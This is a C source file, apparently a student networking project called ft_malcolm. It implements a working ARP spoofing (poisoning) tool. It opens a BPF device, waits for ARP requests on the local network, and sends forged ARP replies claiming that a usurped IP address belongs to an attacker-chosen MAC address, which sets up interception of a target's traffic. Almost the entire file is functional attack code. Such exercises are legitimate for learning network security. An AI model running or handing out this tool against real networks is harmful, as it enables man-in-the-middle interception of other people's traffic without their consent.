# include "ft_malcolm.h"

/*
** Fill an Ethernet Packet with provided data
*/
int	fillEtherPacket(struct ether_header *eth, struct ether_addr *src, struct ether_addr *dst, u_short type)
{
	if (!eth || !src || !dst)
		return EXIT_FAILURE;
	ft_memcpy(eth->ether_shost, src, ETHER_ADDR_LEN);
	ft_memcpy(eth->ether_dhost, dst, ETHER_ADDR_LEN);
	eth->ether_type = htons(type);
	return EXIT_SUCCESS;
}



/*
** Fill an ARP Packet with provided data
*/
int	fillArpPacketOsx(
	struct ether_arp	*arphdr,
	struct ether_addr	*srcMac,
	struct ether_addr	*trgMac,
	u_char *srcIp,
	u_char *trgIp,
	u_short arpType)
{
	if (!arphdr || !srcIp || !trgIp || !srcMac || !trgMac)
		return EXIT_FAILURE;
	/* fill ARP header */
	arphdr->ea_hdr.ar_hrd	= htons(ARPHRD_ETHER);
	arphdr->ea_hdr.ar_pro	= htons(ETHERTYPE_IP);
	arphdr->ea_hdr.ar_hln	= ETHER_ADDR_LEN;
	arphdr->ea_hdr.ar_pln	= IPV4_ADDR_LEN;
	arphdr->ea_hdr.ar_op	= htons(arpType);

	/* fill ARP values */
	ft_memcpy(arphdr->arp_tha, srcMac, ETHER_ADDR_LEN);	/* Destination MAC that we bluff */ /* VM MAC */
	ft_memcpy(arphdr->arp_tpa, srcIp, IPV4_ADDR_LEN);	/* Destination IP that we bluff */ /* VM IP */
	ft_memcpy(arphdr->arp_spa, trgIp, IPV4_ADDR_LEN); 	/* IP that we usurpate */ /* box */
	ft_memcpy(arphdr->arp_sha, trgMac, ETHER_ADDR_LEN);	/* spoffed addr (mine, not the real)*/
	return EXIT_SUCCESS;
}



int	spoofArp(ft_malcolm *malc)
{
	size_t					packageSize = sizeof(struct ether_header) + sizeof(struct ether_arp);
	struct ether_header		*ethhdr = NULL;
	struct ether_arp		*arphdr = NULL;
	struct ether_addr		localMac;
	struct sockaddr			sIpSrc;
	struct sockaddr			sIpTarget;

	if (!(malc->msg = malloc(packageSize)))
	{
		dprintf(STDERR_FILENO, "Malloc msg failed: %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	ethhdr = (struct ether_header *)malc->msg;
	arphdr = (struct ether_arp *)(ethhdr + 1);

	if (getMacAddress(&localMac, malc->if_name))
		return EXIT_FAILURE;

    dprintf(STDOUT_FILENO, "interface: `%s` has MAC address equal to: %02x:%02x:%02x:%02x:%02x:%02x\n", 			malc->if_name,
		localMac.octet[0],
		localMac.octet[1],
		localMac.octet[2],
		localMac.octet[3],
		localMac.octet[4],
		localMac.octet[5]);

	/* fill ethernet header */
	fillEtherPacket(ethhdr, &localMac, &malc->srcMac, ETHERTYPE_ARP);
	/* fill arp header */
	fillArpPacketOsx(arphdr, &malc->srcMac, &malc->targetMac, malc->srcIp, malc->targetIp, ARPOP_REPLY);

	/* Send package */
	char macBuf1[INET_ADDRSTRLEN];
	char macBuf2[INET_ADDRSTRLEN];
	char ipBuf1[ETHER_ADDRSTRLEN];
	char ipBuf2[ETHER_ADDRSTRLEN];
	ssize_t ret = 0;
	ipToSockaddr(malc->srcIp, &sIpSrc);
	ipToSockaddr(malc->targetIp, &sIpTarget);
	dprintf(STDOUT_FILENO, "Sending reply to: %s at %s telling that %s is at %s\n",
		get_ip_str(&sIpSrc, macBuf1, INET_ADDRSTRLEN),
		macToStr(&malc->srcMac, ipBuf1),
		get_ip_str(&sIpTarget, macBuf2, INET_ADDRSTRLEN),
		macToStr(&malc->targetMac, ipBuf2));
	dprintf(STDOUT_FILENO, "Sending frame with a size of: %lu \n", packageSize);
	ret = write(malc->recv_socket, malc->msg, packageSize);
	dprintf(STDOUT_FILENO, "Size sended: %ld\n", ret);

	return EXIT_SUCCESS;
}


int displayifs(ft_malcolm *malc, int all)
{
	char buff[42];
	if (!malc->all_ifs)
	{
		dprintf(STDERR_FILENO, "No interfaces found\n");
		return EXIT_FAILURE;
	}
	dprintf(STDOUT_FILENO, "Interfaces:\n");
	malc->used_ifs = malc->all_ifs;
	while (malc->used_ifs)
	{
		if (malc->used_ifs->ifa_addr->sa_family == AF_INET)
		{
			if (!all && ft_strcmp(malc->used_ifs->ifa_name, "lo0"))
			{
				dprintf(STDOUT_FILENO, "%10s - %s - %s used\n", malc->used_ifs->ifa_name, "IPv4", get_ip_str(malc->used_ifs->ifa_addr, buff, 41));
				return EXIT_SUCCESS;
			}
			else
				dprintf(STDOUT_FILENO, "%10s - %s - %s\n", malc->used_ifs->ifa_name, (malc->used_ifs->ifa_addr->sa_family == AF_INET ? "IPv4" : "IPv6"), get_ip_str(malc->used_ifs->ifa_addr, buff, 41));
		}
		malc->used_ifs = malc->used_ifs->ifa_next;
	}
	return EXIT_SUCCESS;
}

int init_connection(ft_malcolm * malc, char **av)
{
	memset(&malc->conn, 0, sizeof(struct sockaddr_in));
	if (getifaddrs(&malc->all_ifs))
		return EXIT_FAILURE;
	/* Get interface name */
	displayifs(malc, 0);
	ft_strncpy(malc->if_name, malc->used_ifs->ifa_name, IF_NAMESIZE);

	/* Get IP of this interface */
	ft_memcpy(malc->ownIP, malc->used_ifs->ifa_addr->sa_data, IPV4_ADDR_LEN);
	
	/* target MAC */
	ft_capitalize(av[1]);
	strToMac(&malc->srcMac, av[1]);
	ft_capitalize(av[3]);
	strToMac(&malc->targetMac, av[3]);
	struct hostent *hps = gethostbyname(av[0]);
	if (!hps)
	{
		dprintf(STDERR_FILENO, "Unable to resolve %s\n", av[0]);
		return EXIT_FAILURE;	
	}
	dprintf(STDOUT_FILENO, "Hostname: %s, was resolved to: %s\n",
           av[0],inet_ntoa(*(struct in_addr*)hps->h_addr_list[0]));
	ft_memcpy(malc->srcIp, hps->h_addr_list[0], IPV4_ADDR_LEN);



	struct hostent *hpt = gethostbyname(av[2]);
	if (!hpt)
	{
		dprintf(STDERR_FILENO, "Unable to resolve %s\n", av[2]);
		return EXIT_FAILURE;	
	}
	dprintf(STDOUT_FILENO, "Hostname: %s, was resolved to: %s\n",
		av[2],inet_ntoa(*(struct in_addr*)hpt->h_addr_list[0]));
	ft_memcpy(malc->targetIp, hpt->h_addr_list[0], IPV4_ADDR_LEN);


	/* Fill sockaddr(s) with ip */
	char buf[INET_ADDRSTRLEN];
	ipToSockaddr(malc->srcIp, &malc->sockSrcIp);
	ipToSockaddr(malc->targetIp, &malc->sockTargetIp);

	dprintf(STDOUT_FILENO, "source IP: %s\n", get_ip_str(&malc->sockSrcIp, buf, INET_ADDRSTRLEN));
	dprintf(STDOUT_FILENO, "target IP: %s\n", get_ip_str(&malc->sockTargetIp, buf, INET_ADDRSTRLEN));
	

	return EXIT_SUCCESS;
}

int	clean_quit(ft_malcolm *malc)
{
	close(malc->recv_socket);
	freeifaddrs(malc->all_ifs);
	return EXIT_SUCCESS;
}


int waitArpRequestOsx(ft_malcolm *malc)
{
	char buf[100];
	for(int i = 0; i < 99; i++ )
	{
		sprintf( buf, "/dev/bpf%i", i );
		malc->recv_socket = open( buf, O_RDWR );
		if( malc->recv_socket != -1 ) {
			printf("Opened device /dev/bpf%i\n", i);
			break;
		}
	}
	if (malc->recv_socket < 0)
	{
		dprintf(STDERR_FILENO, "Failed to open bpf: %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	if (bpfSetOption(malc->recv_socket, malc->if_name))
		return EXIT_FAILURE;
	else if (bpfCheckDlt(malc->recv_socket))
		return EXIT_FAILURE;
	else if (bpfSetFilter(malc->recv_socket))
		return EXIT_FAILURE;
	else if (read_packets(malc))
		return EXIT_FAILURE;
	dprintf(STDOUT_FILENO, "Now get ready to send an ARP reply\n");

	return EXIT_SUCCESS;
}

int parsing_arguments(int ac, char **av, ft_malcolm *malc)
{
	char buf[4096];
	if (ft_strlen(av[0]) > 4000)
		av[0][4000] = '\0';
	buf[sprintf(buf, "%s [options] [--] usurped_ip local_mac target_ip target_mac_address", av[0])] = '\0';
	const char *const usages[] = {
    	buf,
    	NULL,
	};
	struct argparse_option options[] = {
        OPT_HELP(),
        OPT_GROUP("Basic options"),
        OPT_BOOLEAN('v', "verbose", &malc->verbose, "enable verbose mode.", NULL, 0, 0),
        OPT_STRING('i', "interface", &malc->if_name, "force to use a specific interface.", NULL, 0, 0),
		//add timeout SO_RCVTIMEO
        OPT_END(),
    };
	struct argparse argparse;
	dprintf(1, "ac=%d\n", ac);
    argparse_init(&argparse, options, usages, 0);
    argparse_describe(&argparse, "\nARP spoofing (poisoning) program.", "\nAdditional description of the program after the description of the arguments.");
    ac = argparse_parse(&argparse, ac, (const char**)av);
	dprintf(1, "ac=%d\n", ac);
	if (ac < 4)
	{
		argparse_usage(&argparse);
		return EXIT_FAILURE;
	}
	return EXIT_SUCCESS;
}

int main(int ac, char **av)
{
	ft_malcolm malc;

	if (parsing_arguments(ac, av, &malc))
		return EXIT_FAILURE;
	if (init_connection(&malc, av))
		return EXIT_FAILURE;
# ifdef LINUX
	if (waitArpRequest(&malc))
		return EXIT_FAILURE;
# elif defined OSX
	while (1) {
		if (waitArpRequestOsx(&malc))
			return EXIT_FAILURE;

		/* Tell target that we are source */
			spoofArp(&malc);
		close(malc.recv_socket);
	}
# endif
	if (clean_quit(&malc))
		return EXIT_FAILURE;
	return EXIT_SUCCESS;
}